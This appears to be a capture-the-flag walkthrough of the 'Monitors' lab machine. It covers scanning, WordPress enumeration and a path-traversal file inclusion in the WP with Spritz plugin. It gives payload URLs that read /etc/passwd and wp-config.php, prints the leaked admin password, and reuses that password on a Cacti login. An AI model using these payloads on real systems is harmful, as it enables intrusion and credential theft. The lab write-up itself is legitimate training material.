## ---------->> Monitors <<------------

// We start with nmap scan 

    $ nmap -sV -A -Pn -T4 10.10.10.238 -p-
-----

    Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
    Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-07 14:05 UTC
    Stats: 0:01:57 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
    Connect Scan Timing: About 6.94% done; ETC: 14:33 (0:25:55 remaining)
    Nmap scan report for 10.10.10.238
    Host is up (0.33s latency).
    Not shown: 65533 closed ports
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 ba:cc:cd:81:fc:91:55:f3:f6:a9:1f:4e:e8:be:e5:2e (RSA)
    |   256 69:43:37:6a:18:09:f5:e7:7a:67:b8:18:11:ea:d7:65 (ECDSA)
    |_  256 5d:5e:3f:67:ef:7d:76:23:15:11:4b:53:f8:41:3a:94 (ED25519)
    80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
    |_http-server-header: Apache/2.4.29 (Ubuntu)
    |_http-title: Site doesn't have a title (text/html; charset=iso-8859-1).
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

// Navigating to http://10.10.10.238/ , we can see that the output tells us that we not permmited and contact the admin's mail 

// the mail have the domain after the '@' 

![Image 1]()

// So lets had him to /etc/hosts

    $ cat /etc/hosts

    10.10.10.238	monitors.htb

// [Feroxbuster](https://github.com/epi052/feroxbuster)(By epi052) Tool will help us to search for directories in the webssite

    $ ./feroxbuster -u http://monitors.htb/ -t 100
-----
     ___  ___  __   __     __      __         __   ___
    |__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
    |    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
    by Ben "epi" Risher 🤓                 ver: 2.3.1
    ───────────────────────────┬──────────────────────
     🎯  Target Url            │ http://monitors.htb/
     🚀  Threads               │ 100
     📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
     👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
     💥  Timeout (secs)        │ 7
     🦡  User-Agent            │ feroxbuster/2.3.1
     🔃  Recursion Depth       │ 4
     🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
    ───────────────────────────┴──────────────────────
     🏁  Press [ENTER] to use the Scan Cancel Menu™
    ──────────────────────────────────────────────────
    301        9l       28w      317c http://monitors.htb/wp-content
    301        9l       28w      324c http://monitors.htb/wp-content/themes
    301        9l       28w      325c http://monitors.htb/wp-content/plugins
    301        9l       28w      327c http://monitors.htb/wp-content/languages
    301        9l       28w      335c http://monitors.htb/wp-content/languages/plugins
    301        9l       28w      334c http://monitors.htb/wp-content/languages/themes
    301        9l       28w      315c http://monitors.htb/wp-admin
    301        9l       28w      325c http://monitors.htb/wp-content/upgrade
    301        9l       28w      322c http://monitors.htb/wp-admin/images
    301        9l       28w      318c http://monitors.htb/wp-admin/js
    301        9l       28w      319c http://monitors.htb/wp-admin/css
    301        9l       28w      324c http://monitors.htb/wp-admin/includes
    301        9l       28w      320c http://monitors.htb/wp-admin/user


// The output tells us that the server CMS is WordPress

// We can check for vulnerabilities for Wordpress with [wpscan](https://wpscan.com/) tool

    $ wpscan --url http://monitors.htb/ --api-token YOUR_TOKEN --plugins-detection mixed -e
-------

        _______________________________________________________________
                 __          _______   _____
                 \ \        / /  __ \ / ____|
                  \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
                   \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
                    \  /\  /  | |     ____) | (__| (_| | | | |
                     \/  \/   |_|    |_____/ \___|\__,_|_| |_|

                 WordPress Security Scanner by the WPScan Team
                                 Version 3.8.18
               Sponsored by Automattic - https://automattic.com/
               @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
        _______________________________________________________________

        ......

        [+] wp-with-spritz
         | Location: http://monitors.htb/wp-content/plugins/wp-with-spritz/
         | Latest Version: 1.0 (up to date)
         | Last Updated: 2015-08-20T20:15:00.000Z
         | Readme: http://monitors.htb/wp-content/plugins/wp-with-spritz/readme.txt
         | [!] Directory listing is enabled
         |
         | Found By: Urls In Homepage (Passive Detection)
         | Confirmed By: Known Locations (Aggressive Detection)
         |  - http://monitors.htb/wp-content/plugins/wp-with-spritz/, status: 200
         |
         | [!] 1 vulnerability identified:
         |
         | [!] Title: WP with Spritz 1.0 - Unauthenticated File Inclusion
         |     References:
         |      - https://wpscan.com/vulnerability/cdd8b32a-b424-4548-a801-bbacbaad23f8
         |      - https://www.exploit-db.com/exploits/44544/
         |
         | Version: 4.2.4 (80% confidence)
         | Found By: Readme - Stable Tag (Aggressive Detection)
         |  - http://monitors.htb/wp-content/plugins/wp-with-spritz/readme.txt

        ......

// The output of wpscan shows us there is vulnerability of wp-spritz plugin - Unauthenticated File Inclusion

// Navigating to https://www.exploit-db.com/exploits/44544/ will help us to understant 

![Image 3]()

// Lets try that

    http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../../etc/passwd
    
![Image 4]()

// It worked !

// We can check for WordPress configuration file calle 'wp-config.php'

    http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=../../../wp-config.php

![Image 5]()

// We got Credentials !  wpadmin : BestAdministrator@2020!

// Trying to connect to Wordpress with those credentials didnt work

// So, Since we got successed with the LFI lets try to find some interesting files

// First we need linux directories list, found amazing [lfi-linux-list](https://github.com/carlospolop/hacktricks/blob/a140aa95ee5b53aa4c367cd6d8c5cb96d50dc381/pentesting-web/file-inclusion/lfi-linux-list.md
)(By carlospolop)

// Next we will proceed with the LFI and BurpSuite Intruder and Brute Force the directories to see the responses

![Image 6]()

// We found interesting document in /etc/apache2/sites-enabled/000-default.conf

// Its the apache2 configuration file and he contains a sub domain we need to add to /etc/hosts

    $ cat /etc/hosts

    10.10.10.238	monitors.htb cacti-admin.monitors.htb
    
// Navigating to http://cacti-admin.monitors.htb we represented with login page 

![Image 7]()

// success login with credentials:  admin : BestAdministrator@2020!

// on dashboard page we can see the version is 1.2.12

![Image 8]()

// Lets search for vulnerabilities in [ExploiDB](https://www.exploit-db.com/)

![Image 9]()

// Found a python script for Remote Code Execution(By Leonardo paiva)

// Lets download the Exploit and try him 

